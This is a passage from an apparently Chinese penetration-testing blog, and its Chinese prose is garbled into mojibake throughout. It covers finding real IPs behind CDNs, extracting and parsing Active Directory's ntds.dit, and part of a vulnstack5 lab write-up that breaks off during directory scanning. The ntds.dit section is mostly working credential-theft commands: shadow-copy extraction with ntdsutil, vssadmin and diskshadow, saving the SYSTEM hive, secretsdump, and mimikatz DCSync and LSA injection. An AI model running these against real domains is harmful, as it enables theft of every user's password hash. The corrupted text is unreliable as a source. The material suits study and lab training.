<h4 id="ä½¿ç”¨Fofa-shodan-zoomeye"><a href="#ä½¿ç”¨Fofa-shodan-zoomeye" class="headerlink" title="ä½¿ç”¨Fofa shodan zoomeye"></a>ä½¿ç”¨Fofa shodan zoomeye</h4><p>ä¸€èˆ¬å¸¸ç”¨Fofa å¯ä»¥é€šè¿‡ title body  ip ç­‰è¯­æ³•è¿›è¡ŒæŸ¥è¯¢</p>
<h4 id="åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"><a href="#åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP" class="headerlink" title="åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP"></a>åˆ©ç”¨SSLè¯ä¹¦å¯»æ‰¾çœŸå®IP</h4><p>å¯ä»¥ä½¿ç”¨ <code>https://censys.io/</code> è¿›è¡ŒæŸ¥è¯¢</p>
<h4 id="é€šè¿‡icon-hashæŸ¥ip"><a href="#é€šè¿‡icon-hashæŸ¥ip" class="headerlink" title="é€šè¿‡icon hashæŸ¥ip"></a>é€šè¿‡icon hashæŸ¥ip</h4><p>ä¸€èˆ¬å…ˆå°† favicon.ico ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åä¸Šä¼ åˆ°fofaä¸Šå³å¯</p>
<h4 id="ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå"><a href="#ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå" class="headerlink" title="ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå"></a>ä½¿ç”¨å›½å¤–ä¸»æœºè§£æåŸŸå</h4><p>æœ‰äº›å›½å†…çš„CDNå‚å¯èƒ½åªåšäº†å›½å†…çº¿è·¯ï¼Œè€Œé’ˆå¯¹å›½å¤–çš„çº¿è·¯å¯èƒ½å‡ ä¹æ²¡æœ‰ï¼Œæ‰€ä»¥å°è¯•ä½¿ç”¨å›½å¤–çš„ä¸»æœºå»è®¿é—®å¯èƒ½ä¼šå¾—åˆ°çœŸå®ip</p>
<h4 id="é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip"><a href="#é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip" class="headerlink" title="é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip"></a>é€šè¿‡ç½‘ç«™æ¼æ´æŸ¥æ‰¾çœŸå®ip</h4><p>å¯ä»¥é€šè¿‡phpinfoä¹‹ç±»çš„æ¢é’ˆï¼Œxss. ssrf, å‘½ä»¤æ‰§è¡Œåå¼¹shell æºç æ³„æ¼ æ•æ„Ÿä¿¡æ¯æ³„æ¼ä¹‹ç±»</p>
<h4 id="F5-LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰"><a href="#F5-LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰" class="headerlink" title="F5 LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰"></a>F5 LTMè§£ç æ³•ï¼ˆè¿˜æ²¡å°è¯•è¿‡ï¼ŒæŠ½æ—¶é—´æµ‹è¯•ä¸‹ï¼‰</h4><p>å½“æœåŠ¡å™¨ä½¿ç”¨F5 LTMåšè´Ÿè½½å‡è¡¡æ—¶ï¼Œé€šè¿‡å¯¹set-cookieå…³é”®å­—çš„è§£ç çœŸå®ipä¹Ÿå¯è¢«è·å–ï¼Œä¾‹å¦‚ï¼šSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000ï¼Œå…ˆæŠŠç¬¬ä¸€å°èŠ‚çš„åè¿›åˆ¶æ•°å³487098378å–å‡ºæ¥ï¼Œç„¶åå°†å…¶è½¬ä¸ºåå…­è¿›åˆ¶æ•°1d08880aï¼Œæ¥ç€ä»åè‡³å‰ï¼Œä»¥æ­¤å–å››ä½æ•°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯0a.88.08.1dï¼Œæœ€åä¾æ¬¡æŠŠä»–ä»¬è½¬ä¸ºåè¿›åˆ¶æ•°10.136.8.29ï¼Œä¹Ÿå°±æ˜¯æœ€åçš„çœŸå®ipã€‚</p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>ntds.ditå¯¼å‡ºåŠè§£æ</title>
    <url>/posts/77c245ea/</url>
    <content><![CDATA[<h3 id="æå–ntds-dit"><a href="#æå–ntds-dit" class="headerlink" title="æå–ntds.dit"></a>æå–ntds.dit</h3><h4 id="ä½¿ç”¨ntdsutil-å·¥å…·æå–"><a href="#ä½¿ç”¨ntdsutil-å·¥å…·æå–" class="headerlink" title="ä½¿ç”¨ntdsutil å·¥å…·æå–"></a>ä½¿ç”¨ntdsutil å·¥å…·æå–</h4><p>ntdsutil.exeæ˜¯ä¸€ä¸ªä¸ºæ´»åŠ¨ç›®å½•æä¾›ç®¡ç†æœºåˆ¶çš„å‘½ä»¤è¡Œå·¥å…·ã€‚ä½¿ç”¨ntdsutil.exeå¯ä»¥ç»´æŠ¤å’Œç®¡ç†äº’åŠ¨ç›®å½•æ•°æ®åº“ã€æ§åˆ¶å•ä¸ªä¸»æœºæ“ä½œã€åˆ›å»ºåº”ç”¨ç¨‹åºç›®å½•åˆ†åŒºã€åˆ é™¤ç”±æœªä½¿ç”¨æ´»åŠ¨ç›®å½•å®‰è£…å‘å¯¼ï¼ˆDCPRome.exeï¼‰æˆåŠŸé™çº§çš„åŸŸæ§åˆ¶å™¨ç•™ä¸‹çš„å…ƒæ•°æ®ç­‰ã€‚è¯¥å·¥å…·é»˜è®¤å®‰è£…åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼Œå¯ä»¥åœ¨åŸŸæ§åˆ¶å™¨ä¸Šç›´æ¥æ“ä½œï¼Œå¯ä»¥é€šè¿‡åŸŸå†…æœºå™¨åœ¨åŸŸæ§åˆ¶å™¨ä¸Šè¿œç¨‹æ“ä½œã€‚</p>
<p>ntdsutil.exe æ”¯æŒçš„æ“ä½œç³»ç»ŸåŒ…æ‹¬ Windows server 2003 ï¼ŒWindows server 2008ï¼ŒWindows server 2012</p>
<p> ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<h5 id="åˆ›å»ºå¿«ç…§"><a href="#åˆ›å»ºå¿«ç…§" class="headerlink" title="åˆ›å»ºå¿«ç…§"></a>åˆ›å»ºå¿«ç…§</h5><p>è¯¥å¿«ç…§åŒ…å«windowsä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼Œä¸”åœ¨å¤åˆ¶æ–‡ä»¶æ—¶ä¸ä¼šå—åˆ°windowsé”å®šæœºåˆ¶çš„é™åˆ¶</p>
<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
<p>{}å†…ä¸ºå¿«ç…§çš„GUID</p>
<p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
<h5 id="æŒ‚è½½å¿«ç…§"><a href="#æŒ‚è½½å¿«ç…§" class="headerlink" title="æŒ‚è½½å¿«ç…§"></a>æŒ‚è½½å¿«ç…§</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
<h5 id="æ‹·è´å¿«ç…§"><a href="#æ‹·è´å¿«ç…§" class="headerlink" title="æ‹·è´å¿«ç…§"></a>æ‹·è´å¿«ç…§</h5><p>ä½¿ç”¨windowsè‡ªå¸¦çš„copyå‘½ä»¤å°†å¿«ç…§ä¸­çš„æ–‡ä»¶å¤åˆ¶å‡ºæ¥,å°†å¿«ç…§ä¸­çš„<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>å¤åˆ¶åˆ°æœ¬åœ°è®¡ç®—æœºçš„ <code>C:\Users\Administrator\Desktop\</code> æ¡Œé¢ä¸Š</p>
<p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
<p><img src="/posts/77c245ea/copy_ntds.png"></p>
<h5 id="å¸è½½å¹¶åˆ é™¤å¿«ç…§"><a href="#å¸è½½å¹¶åˆ é™¤å¿«ç…§" class="headerlink" title="å¸è½½å¹¶åˆ é™¤å¿«ç…§"></a>å¸è½½å¹¶åˆ é™¤å¿«ç…§</h5><p><code>ntdsutil snapshot &quot;unmout &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_delete_snapshot.png"></p>
<h5 id="æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤"><a href="#æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤" class="headerlink" title="æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤"></a>æ£€æŸ¥å¿«ç…§æ˜¯å¦åˆ é™¤</h5><p><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_check_snapshot.png"></p>
<br>

<h4 id="åˆ©ç”¨vssadminæå–ntds-dit"><a href="#åˆ©ç”¨vssadminæå–ntds-dit" class="headerlink" title="åˆ©ç”¨vssadminæå–ntds.dit"></a>åˆ©ç”¨vssadminæå–ntds.dit</h4><p><code>vssadmin</code>æ˜¯Windowsä¸Šçš„ä¸€ä¸ªå·å½±æ‹·è´æœåŠ¡çš„å‘½ä»¤è¡Œç®¡ç†å·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ã€åˆ—å‡ºå·å½±æ‹·è´çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºå·²å®‰è£…çš„æ‰€æœ‰å·å½±æ‹·è´å†™å…¥ç¨‹åºå’Œæä¾›ç¨‹åºï¼Œä»¥åŠæ”¹å˜å·å½±æ‹·è´çš„å­˜å‚¨ç©ºé—´çš„å¤§å°ç­‰ã€‚</p>
<p>é€‚ç”¨äº   Windows 10ï¼ŒWindows 8.1ï¼ŒWindows Server 2016ï¼ŒWindows Server 2012 R2ï¼ŒWindows Server 2012ï¼ŒWindows Server 2008 R2ï¼ŒWindows Server 2008</p>
<h5 id="åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´"><a href="#åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´" class="headerlink" title="åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´"></a>åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´</h5><p><code>vssadmin create shadow /for=c:</code></p>
<h5 id="å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds-dit-copyåˆ°æ¡Œé¢"><a href="#å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds-dit-copyåˆ°æ¡Œé¢" class="headerlink" title="å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds.dit copyåˆ°æ¡Œé¢"></a>å°†åˆ›å»ºçš„å·å½±æ‹·è´ä¸­çš„ntds.dit copyåˆ°æ¡Œé¢</h5><p><code>copy \\?\CLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\User\Administrator\Desktop ntds.dit</code></p>
<h5 id="åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´"><a href="#åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´" class="headerlink" title="åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´"></a>åˆ é™¤åˆ›å»ºçš„å·å½±æ‹·è´</h5><p><code>vssadmin delete shadows /for=c:  /quiet</code></p>
<p><img src="/posts/77c245ea/vssadmin.png"></p>
<br>

<h4 id="åˆ©ç”¨vssown-vbs-è„šæœ¬æå–nods-dit"><a href="#åˆ©ç”¨vssown-vbs-è„šæœ¬æå–nods-dit" class="headerlink" title="åˆ©ç”¨vssown.vbs è„šæœ¬æå–nods.dit"></a>åˆ©ç”¨vssown.vbs è„šæœ¬æå–nods.dit</h4><p>ä¸‹è½½åœ°å€ï¼š<code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></p>
<p>vssown.vbsåŠŸèƒ½ä¸vssadminç±»ä¼¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡wmiå¯¹shadowCoptè¿›è¡Œæ“ä½œï¼Œå¯ç”¨äºåˆ›å»ºå’Œåˆ é™¤å·å½±æ‹·è´ï¼Œä»¥åŠå¯åŠ¨å’Œåœæ­¢å·å½±æ‹·è´æœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯åŠ¨å·å½±æ‹·è´æœåŠ¡</span><br><span class="line">cscript vssown.vbs /start</span><br><span class="line">//åˆ›å»ºä¸€ä¸ªCç›˜çš„å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs /create c</span><br><span class="line">//åˆ—å‡ºå½“å‰å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs /list</span><br><span class="line">//å¤åˆ¶ntds.ditåˆ°æ¡Œé¢</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</span><br><span class="line">//åˆ é™¤å·å½±æ‹·è´</span><br><span class="line">cscript vssown.vbs /delete &#123;GUID&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/vssown.png"></p>
<h4 id="ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds-dit"><a href="#ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds-dit" class="headerlink" title="ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds.dit"></a>ä½¿ç”¨ntdsutilä¸­çš„IFMè·å–ntds.dit</h4><p>å°†ntds.ditå¤åˆ¶åˆ°<code>C:\test\Active Directory\ </code>æ–‡ä»¶å¤¹ä¸­</p>
<p>ä½¿ç”¨ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€cmdè¾“å…¥å¦‚ä¸‹</p>
<p><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:/test&quot; q  q</code></p>
<p><img src="/posts/77c245ea/ntdsutil_IFM.png"></p>
<p>ç„¶åè®¿é—®cç›˜ å¯ä»¥çœ‹åˆ°åˆ›å»ºäº†ä¸€ä¸ªtestç›®å½•  </p>
<p>testç›®å½•ä¸‹æœ‰ä¿©ä¸ªæ–‡ä»¶ åˆ†åˆ«ä¸º <code>Active Directory</code>  å’Œ <code>registry</code></p>
<p><code>registry</code>ä¸‹åŒ…å« <code>SYSTEM</code> å’Œ <code>SECURITY</code></p>
<p><code>Active Directory</code>ä¸‹åŒ…å« <code>ntds.dit</code></p>
<p><img src="/posts/77c245ea/test_file.png"></p>
<p>ç„¶åå°†ä»¥ä¸Šå†…å®¹å¤åˆ¶åˆ°æ¡Œé¢</p>
<p>è¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>Copy-VSS.ps1</code></p>
<p>ä¸‹è½½åœ°å€ï¼š<code>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</code></p>
<p>è¿›å…¥powershell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-Executionpolicy bypass</span><br><span class="line">Import-Module .\Copy-VSS.ps1  //å¯¼å…¥è„šæœ¬</span><br><span class="line">copy-vss    //æ‰§è¡Œè„šæœ¬</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/copy_vss.png"></p>
<br>

<h4 id="ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit"><a href="#ä½¿ç”¨diskshadowå¯¼å‡ºntds-dit" class="headerlink" title="ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit"></a>ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit</h4><p><code>Diskshadow.exe</code>ä½¿ç”¨å·å½±æ‹·è´æœåŠ¡ï¼ˆVSSï¼‰æ‰€æä¾›çš„å¤šä¸ªåŠŸèƒ½ã€‚é»˜è®¤é…ç½®ä¸‹ï¼ŒDiskshadow.exeä½¿ç”¨äº†ä¸€ç§äº¤äº’å¼çš„å‘½ä»¤è§£é‡Šå™¨,è¿™é‡Œè·ŸDiskRaidæˆ–è€…DiskPartæ¯”è¾ƒç±»ä¼¼ã€‚å› ä¸ºdiskshadowçš„ä»£ç æ˜¯ç”±å¾®è½¯ç­¾åçš„ï¼Œè€Œä¸”<code>Windows Server2008ã€Windows Server2012ã€Windows Server2016éƒ½é»˜è®¤åŒ…å«diskshadow</code>ã€‚æ‰€ä»¥ï¼Œdiskshadowä¹Ÿå¯ä»¥ç”¨æ¥æ“ä½œå·å½±æ‹·è´æœåŠ¡å¹¶å¯¼å‡ºntds.ditã€‚diskshadowçš„åŠŸèƒ½ä¸vshadowç±»ä¼¼ï¼Œä¸”åŒæ ·ä½äº<code>C:\windows\system32\ </code>ç›®å½•ä¸‹.</p>
<p>ç”±äºæ˜¯å¾®è½¯å®˜æ–¹çš„å·¥å…·ï¼Œæ‰€ä»¥ä¸ä¼šè¢«æ€</p>
<p>æŸ¥çœ‹<code>diskshadow.exe</code> çš„å¸®åŠ©ä¿¡æ¯</p>
<p><code>diskshdow /?</code></p>
<p>ä¸€èˆ¬å…ˆåœ¨Cç›˜å†™å…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ å­˜å‚¨ä¸ºcommand.txt</p>
<p><code>echo &quot;exec c:\windows\system32\calc.exe&quot;  &gt;command.txt</code></p>
<p>ä½†æ˜¯è¿™æ ·ç”Ÿæˆçš„commod.txtä¼šå­˜åœ¨åŒå¼•å· è¿™æ ·æ‰§è¡Œdiskshadowå‘½ä»¤çš„è¯ ä¼šæ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥æœ€å¥½åœ¨æ‰§è¡Œdiskshadowå‘½ä»¤å‰å…ˆçœ‹ä¸‹command.txt æ˜¯å¦æ­£ç¡®</p>
<p><code>type c:\command.txt</code></p>
<p><code>diskshadow /s c:\command</code> </p>
<p>ç„¶åä¼šå¼¹å‡ºä¹‹å‰å†™çš„calc</p>
<p><img src="/posts/77c245ea/diskshadow_calc.png"></p>
<p>ä½¿ç”¨<code>diskshadow.exe</code>å¯¼å‡º<code>ntds.dit</code> å°†å‘½ä»¤å†™å…¥æ–‡æœ¬æ–‡ä»¶ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è®¾ç½®å·å½±æ‹·è´</span><br><span class="line">set context persistent nowriters</span><br><span class="line">//æ·»åŠ å·</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">//åˆ›å»ºå¿«ç…§</span><br><span class="line">create</span><br><span class="line">//åˆ†é…è™šæ‹Ÿç£ç›˜ç›˜ç¬¦</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">//å°†ntds.ditå¤åˆ¶åˆ°Cç›˜ä¸­</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy k:\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\</span><br><span class="line">//åˆ é™¤æ‰€æœ‰å¿«ç…§</span><br><span class="line">delete shadows all</span><br><span class="line">//åˆ—å‡ºç³»ç»Ÿä¸­çš„å·å½±æ‹·è´</span><br><span class="line">list shadows all</span><br><span class="line">//é‡ç½®</span><br><span class="line">reset</span><br><span class="line">//é€€å‡º</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>

<p>ç„¶åä½¿ç”¨<code>diskshadow.exe</code>åŠ è½½è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶</p>
<p><code>diskshadow /s c:\2.txt</code></p>
<p>åœ¨æ‰§è¡Œè¿™æ¡å‘½ä»¤æ—¶ è¦åœ¨system32ä¸‹æ‰§è¡Œï¼Œå¦åˆ™å¯èƒ½ä¼šæŠ¥é”™</p>
<p><img src="/posts/77c245ea/diskshadow_2.png"></p>
<p>å¯¼å‡ºntds.ditåï¼Œå¯ä»¥å°†system.hiveè½¬å‚¨ã€‚å› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€ntds.ditçš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰è¯¥å¯†é’¥ï¼Œå°†æ— æ³•æŸ¥çœ‹ntds.ditä¸­çš„ä¿¡æ¯</p>
<p>å¯ä»¥ä½¿ç”¨Copy-VSS.ps1ç­‰æ–¹æ³•å¯¼å‡ºSYSTEMæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†å¯¼å‡ºsystem</p>
<p><code>reg save hklm\system C:\Users\Administrator\Desktop\system.hive</code></p>
<p><img src="/posts/77c245ea/reg_system.png"></p>
<br>

<h3 id="è§£æntds-dit"><a href="#è§£æntds-dit" class="headerlink" title="è§£æntds.dit"></a>è§£æntds.dit</h3><h4 id="ä½¿ç”¨impacket-secretsdumpè§£æntds-dit"><a href="#ä½¿ç”¨impacket-secretsdumpè§£æntds-dit" class="headerlink" title="ä½¿ç”¨impacket secretsdumpè§£æntds.dit"></a>ä½¿ç”¨impacket secretsdumpè§£æntds.dit</h4><p><code>secretsdump.exe -system SYSTEM.hive -ntds ntds.dit LOCAL</code></p>
<p>ç„¶åå¯ä»¥çœ‹åˆ°æ‰€æœ‰ç”¨æˆ·çš„hashå€¼</p>
<p><img src="/posts/77c245ea/secretsdump_ntds.png"></p>
<h4 id="åˆ©ç”¨dcsync-è·å–åŸŸæ•£åˆ—å€¼"><a href="#åˆ©ç”¨dcsync-è·å–åŸŸæ•£åˆ—å€¼" class="headerlink" title="åˆ©ç”¨dcsync è·å–åŸŸæ•£åˆ—å€¼"></a>åˆ©ç”¨dcsync è·å–åŸŸæ•£åˆ—å€¼</h4><h5 id="åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash"><a href="#åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash" class="headerlink" title="åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash"></a>åˆ©ç”¨mimikatzåœ¨çº¿å¯¼å‡ºhash</h5><p>å¯ä»¥åˆ©ç”¨dcsyncè·å–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:mamor.com /all /csv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/mimikatz_dcsync.png"></p>
<p>ä¹Ÿå¯ä»¥å¯¼å‡ºæŒ‡å®šç”¨æˆ·çš„hashå€¼</p>
<p><code>lsadump::dcsync /domain:mamor.com /user:Mamor</code></p>
<p><img src="/posts/77c245ea/dcsync_user.png"></p>
<p>é€šè¿‡è½¬å‚¨lsass.exe è¿›ç¨‹å¯¹hashå€¼è¿›è¡Œdump</p>
<p><code>lsadump::lsa  /inject</code></p>
<p>è¿™æ ·å¯ä»¥å¯¼å‡ºæ‰€æœ‰è´¦æˆ·å’ŒåŸŸæ•£åˆ—å€¼</p>
<p><img src="/posts/77c245ea/mimikatz_lsa1.png"></p>
<p><img src="/posts/77c245ea/mimikatz_lsa2.png"></p>
<h5 id="ä½¿ç”¨powershell-Invoke-DCSync-ps1è„šæœ¬"><a href="#ä½¿ç”¨powershell-Invoke-DCSync-ps1è„šæœ¬" class="headerlink" title="ä½¿ç”¨powershell Invoke-DCSync.ps1è„šæœ¬"></a>ä½¿ç”¨powershell Invoke-DCSync.ps1è„šæœ¬</h5><p>ä¸‹è½½åœ°å€ï¼š<code>https://gist.github.com/monoxgas/9d238accd969550136db</code></p>
<p>è¯¥è„šæœ¬å¯ä»¥åˆ©ç”¨dcsync ç›´æ¥è¯»å–ntds.dit ä»¥è·å¾—åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    // å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/77c245ea/ps_invoke-DCSync.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/">https://pingmaoer.github.io/2020/07/03/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8/</a></p>
<p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1731472">https://cloud.tencent.com/developer/article/1731472</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack5é¶åœº</title>
    <url>/posts/4f399e45/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><blockquote>
<p>2008     192.168.138.138(å†…ç½‘)             sun\admin 2021.com</p>
<p>win7     192.168.138.136(å†…ç½‘)            192.168.135.150(å¤–ç½‘)</p>
<p>sun\leo123.com    sun\Administrator dc123.com</p>
<p>å¯åŠ¨phpstudy</p>
<p>kali        192.168.135.128(å¤–ç½‘)</p>
</blockquote>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>sudo nmap -sV 192.168.135.150 </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.135.150</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line">Not shown: 991 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: SUN)</span><br><span class="line">3306/tcp  open  mysql        MySQL (unauthorized)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49176/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:B5:F4:E9 (VMware)</span><br><span class="line">Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>å¼€æ”¾äº†80ï¼Œ3306 ç³»ç»Ÿä¸ºWin7</p>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p><code>dirmap -i 192.168.135.150 -lcf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Load targets from: 192.168.135.150</span><br><span class="line">[+] Set the number of thread: 30</span><br><span class="line">[+] Coroutine mode</span><br><span class="line">[+] Current target: http://192.168.135.150/                                                 </span><br><span class="line">[*] Launching auto check 404</span><br><span class="line">[+] Checking with: http://192.168.135.150/hsnwdxgvjhcohdgnyqwwyagtdjaanxwsamkblggcfg</span><br><span class="line">[*] Use recursive scan: No                                                                  </span><br><span class="line">[*] Use dict mode</span><br><span class="line">[+] Load dict:/home/kali/Tools/dirmap/data/dict_mode_dict.txt</span><br><span class="line">[*] Use crawl mode</span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/0                           </span><br><span class="line">[200][text/html; charset=utf-8][1.60kb] http://192.168.135.150/add.php                      </span><br><span class="line">[200][image/x-icon][1.12kb] http://192.168.135.150/favicon.ico                              </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/Index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index                        </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.html                   </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.php                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/INDEX.PHP                    </span><br><span class="line">[200][text/html; charset=utf-8][931.00b] http://192.168.135.150/index.PHP                    